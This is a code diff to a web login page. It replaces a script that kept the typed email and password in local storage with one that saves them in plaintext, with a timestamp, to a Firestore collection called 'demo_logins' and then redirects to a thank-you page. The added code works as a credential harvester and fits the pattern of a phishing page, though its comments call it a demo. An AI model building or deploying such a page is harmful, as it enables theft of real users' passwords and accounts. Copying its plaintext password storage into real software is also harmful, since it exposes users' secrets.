@@ -44,20 +44,27 @@
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = form.email.value;
-      const password = form.password.value;
+const form = document.getElementById('loginForm');
 
-      // Store locally for demo only
-      localStorage.setItem('demo_email', email);
-      localStorage.setItem('demo_password', password);
-      console.log('Captured (demo only):', email, password);
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const email = form.email.value;
+  const password = form.password.value;
 
-      // Redirect to thank you page
-      window.location.href = 'thankyou.html';
-    });
-  </script>
+  // Save credentials to Firestore
+  db.collection("demo_logins").add({
+    email: email,
+    password: password,
+    time: new Date().toLocaleString()
+  })
+  .then(() => {
+    console.log("Saved to Firebase!");
+    window.location.href = "thankyou.html"; // redirect after submit
+  })
+  .catch((error) => {
+    console.error("Error writing to Firebase:", error);
+  });
+});
+</script>
 </body>
 </html>
